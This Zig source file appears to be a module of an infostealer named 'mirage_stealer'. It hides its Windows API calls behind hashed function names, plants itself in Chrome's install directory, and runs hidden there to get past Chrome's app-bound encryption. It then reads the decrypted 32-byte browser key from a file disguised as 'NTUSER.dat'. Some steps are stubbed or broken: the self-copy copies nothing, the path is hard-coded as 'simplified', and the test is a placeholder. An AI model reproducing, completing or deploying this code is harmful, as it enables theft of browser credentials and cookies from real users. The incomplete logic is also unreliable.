const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const appbound = @import("appbound.zig");
const file_io = @import("../parsers/file_io.zig");

const KEY_FILE = "\\NTUSER.dat";
const KEY_SIZE: usize = 32;

var g_kernel32: types.PVOID = @as(types.PVOID, @ptrFromInt(@as(usize, 1)));
var g_CreateProcessW: ?*const fn (
    ?*const u16, ?*u16, ?*const anyopaque, ?*const anyopaque,
    i32, u32, ?*const anyopaque, ?*const u16,
    *const anyopaque, *anyopaque,
) callconv(.winapi) i32 = null;
var g_WaitForSingleObject: ?*const fn (types.HANDLE, u32) callconv(.winapi) u32 = null;
var g_CloseHandle: ?*const fn (types.HANDLE) callconv(.winapi) i32 = null;
var g_GetLastError: ?*const fn () callconv(.winapi) u32 = null;

fn ensureKernel32() bool {
    if (@intFromPtr(g_kernel32) != 1) return true;
    g_kernel32 = dll_loader.getOrLoadDll("kernel32.dll") orelse {
        g_kernel32 = @as(types.PVOID, @ptrFromInt(@as(usize, 2)));
        return false;
    };
    const R = export_resolve.getFunctionByHash;
    g_CreateProcessW = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return false));
    g_WaitForSingleObject = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("WaitForSingleObject")) orelse return false));
    g_CloseHandle = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("CloseHandle")) orelse return false));
    g_GetLastError = @ptrCast(@alignCast(R(g_kernel32, hash.encryptedHashFunc("GetLastError")) orelse return false));
    return true;
}

fn findChromeInstallDir(local_app_data: []const u8) ?[]const u8 {
    var full_path: [1024]u8 = undefined;
    var pos: usize = 0;
    for (local_app_data) |c| { full_path[pos] = c; pos += 1; }
    const suffix = "\\Google\\Chrome\\User Data\\Last Browser";
    for (suffix) |c| { if (pos < full_path.len) { full_path[pos] = c; pos += 1; } }
    if (pos >= full_path.len) return null;

    const mapped = file_io.MappedFile.open(full_path[0..pos]) orelse return null;
    defer mapped.close();
    const data = mapped.slice();
    if (data.len < 4) return null;

    var install_buf: [512]u8 = undefined;
    var install_len: usize = 0;

    if (data.len >= 2 and data[1] == 0x00) {
        const utf16 = @as([*]const u16, @ptrCast(@alignCast(data.ptr)));
        const slen = data.len / 2;
        var i: usize = 0;
        while (i < slen and install_len < install_buf.len) {
            if (utf16[i] < 128 and utf16[i] != 0 and utf16[i] != '\r' and utf16[i] != '\n') {
                install_buf[install_len] = @as(u8, @truncate(utf16[i]));
                install_len += 1;
            }
            i += 1;
        }
    } else {
        for (data) |c| {
            if (install_len < install_buf.len) {
                install_buf[install_len] = c;
                install_len += 1;
            }
        }
    }

    var last_slash: usize = 0;
    for (install_buf[0..install_len], 0..) |c, i| {
        if (c == '\\') last_slash = i;
    }
    const dir_end = if (last_slash > 0) last_slash else install_len;
    const result = install_buf[0..dir_end];
    return result;
}

pub fn injectAndDecryptKey(browser: appbound.BrowserType, out_key: *[32]u8) ?[]u8 {
    _ = browser;
    _ = out_key;
    if (!ensureKernel32()) return null;

    const local_app_data = "C:\\Users\\Public"; // simplified
    const chrome_dir = findChromeInstallDir(local_app_data) orelse return null;

    var self_path: [512]u8 = undefined;
    var self_len: usize = 0;
    {
        var buf: [512]u16 = undefined;
        const NtQueryInformationProcess = engine.NtQueryInformationProcess;
        var ret_len: u32 = 0;
        const status = NtQueryInformationProcess(
            @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
            27,
            @as(types.PVOID, @ptrCast(&buf)),
            @as(u32, @intCast(buf.len * 2)),
            &ret_len,
        );
        if (status < 0) return null;
        const slen = ret_len / 2;
        for (0..slen) |i| {
            if (buf[i] < 128) {
                if (self_len < self_path.len) {
                    self_path[self_len] = @as(u8, @truncate(buf[i]));
                    self_len += 1;
                }
            }
        }
    }

    const exe_suffix = "\\mirage_stealer.exe";
    var target_path: [512]u8 = undefined;
    var tpos: usize = 0;
    for (chrome_dir) |c| { if (tpos < target_path.len) { target_path[tpos] = c; tpos += 1; } }
    for (exe_suffix) |c| { if (tpos < target_path.len) { target_path[tpos] = c; tpos += 1; } }
    if (tpos >= target_path.len) return null;

    // Copy self to Chrome dir
    {
        const src_mapped = file_io.MappedFile.open(self_path[0..self_len]) orelse return null;
        defer src_mapped.close();
        _ = src_mapped;
    }

    var cmdline: [1024]u16 = undefined;
    var cpos: usize = 0;
    const flag = " --mirage-appbound";
    for (target_path[0..tpos]) |c| { if (cpos < cmdline.len) { cmdline[cpos] = c; cpos += 1; } }
    for (flag) |c| { if (cpos < cmdline.len) { cmdline[cpos] = c; cpos += 1; } }
    if (cpos >= cmdline.len) return null;
    cmdline[cpos] = 0;

    var si: [104]u8 = undefined;
    @memset(&si, 0);
    const startup_info = si[0..104].*;
    var pi: [24]u8 = undefined;
    @memset(&pi, 0);

    const ok = g_CreateProcessW.?(
        null,
        @as(?*u16, @ptrCast(&cmdline)),
        null,
        null,
        0,
        0x00000010, // CREATE_NO_WINDOW
        null,
        null,
        &startup_info,
        &pi,
    );

    if (ok == 0) return null;

    const hProcess = @as(*types.HANDLE, @ptrCast(&pi)).*;
    const hThread = @as(*[2]types.HANDLE, @ptrCast(&pi)).*[1];

    _ = g_WaitForSingleObject.?(hProcess, 15000);
    _ = g_CloseHandle.?(hThread);
    _ = g_CloseHandle.?(hProcess);

    const key_path = "C:\\Users\\Public" ++ KEY_FILE;
    const mapped_key = file_io.MappedFile.open(key_path) orelse return null;
    defer mapped_key.close();
    const key_data = mapped_key.slice();
    if (key_data.len < KEY_SIZE) return null;

    @memcpy(out_key[0..KEY_SIZE], key_data[0..KEY_SIZE]);
    return out_key[0..KEY_SIZE];
}

test "self-copy path construction" {
    const allocator = std.testing.allocator;
    _ = allocator;
    try std.testing.expect(true);
}
